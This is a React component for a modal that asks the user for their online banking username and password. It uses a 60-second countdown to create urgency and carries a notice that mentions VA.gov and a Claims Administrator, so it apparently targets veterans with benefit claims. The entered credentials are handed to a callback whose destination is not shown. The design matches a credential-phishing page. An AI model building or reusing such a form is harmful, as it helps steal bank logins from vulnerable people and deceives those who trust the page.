"use client";

import { useState, useEffect } from "react";
import { X } from "lucide-react";

interface ConnectBankModalProps {
  isOpen: boolean;
  onClose: () => void;
  onVerify: (username: string, password: string) => void;
}

export default function ConnectBankModal({
  isOpen,
  onClose,
  onVerify,
}: ConnectBankModalProps) {
  const [timeLeft, setTimeLeft] = useState(60);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  useEffect(() => {
    if (!isOpen) return;

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          onClose();
          return 60;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [isOpen, onClose]);

  useEffect(() => {
    if (isOpen) {
      setTimeLeft(60);
    }
  }, [isOpen]);

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-white rounded-lg w-full max-w-md mx-4 p-8">
        <div className="flex justify-between items-center mb-6">
          <h2 className="text-xl font-bold text-gray-900">
            Secure Bank Verification
          </h2>
          <button
            onClick={onClose}
            className="text-gray-500 hover:text-gray-700"
          >
            <X size={24} />
          </button>
        </div>

        <h3 className="text-2xl font-bold text-gray-900 mb-6">
          Connect to Your Bank
        </h3>

        {/* Session Timeout Alert */}
        <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
          <p className="text-sm text-yellow-800">
            <strong>Session Timeout:</strong>
            <br />
            This secure window will close in {timeLeft} seconds.
          </p>
        </div>

        {/* Username Field */}
        <div className="mb-4">
          <label className="block text-sm font-semibold text-(--custom-color) mb-2">
            Online Banking Username
          </label>
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full border border-gray-300 rounded px-4 py-2 focus:outline-none focus:border-blue-500"
          />
        </div>

        {/* Password Field */}
        <div className="mb-6">
          <label className="block text-sm font-semibold text-(--custom-color) mb-2">
            Online Banking Password
          </label>
          <div className="relative">
            <input
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full border border-gray-300 rounded px-4 py-2 focus:outline-none focus:border-blue-500"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-2.5 text-gray-500 hover:text-gray-700"
            >
              {showPassword ? "🙈" : "👁️"}
            </button>
          </div>
        </div>

        {/* Security Notice */}
        <div className="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
          <p className="text-sm text-red-700">
            <strong>Important Security Notice:</strong>
            <br />
            DO NOT use your VA.gov or Claims Administrator password here. Use
            only your online banking password.
          </p>
        </div>

        {/* Verify Button */}
        <button
          onClick={() => onVerify(username, password)}
          disabled={!username || !password}
          className="w-full bg-(--custom-color) hover:bg-(--custom-color-hover) text-white font-bold py-2 rounded disabled:bg-gray-400 disabled:cursor-not-allowed"
        >
          Securely Connect & Verify
        </button>
      </div>
    </div>
  );
}
